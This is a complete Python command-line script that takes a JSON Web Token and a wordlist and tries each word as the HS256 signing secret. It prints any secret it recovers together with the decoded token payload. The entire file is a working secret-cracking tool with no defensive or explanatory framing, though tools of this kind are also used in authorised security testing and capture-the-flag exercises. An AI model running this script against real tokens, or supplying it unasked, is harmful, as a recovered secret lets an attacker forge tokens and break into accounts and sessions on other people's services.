import jwt
import sys

def brute_force(jwt_token, wordlist_file):
    with open(wordlist_file, 'r') as wordlist:
        for secret in wordlist:
            secret = secret.strip()
            try:
                payload = jwt.decode(jwt_token, secret, algorithms=['HS256'])
                print(f"Valid secret found: {secret}")
                print(f"Payload: {payload}")
                return
            except jwt.InvalidTokenError:
                continue
    
    print("No valid secret found in the wordlist.")
    return

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <jwt_token> <wordlist_file>")
        sys.exit(1)

    jwt_token = sys.argv[1]
    wordlist_file = sys.argv[2]

    brute_force(jwt_token, wordlist_file)

if __name__ == "__main__":
    main()

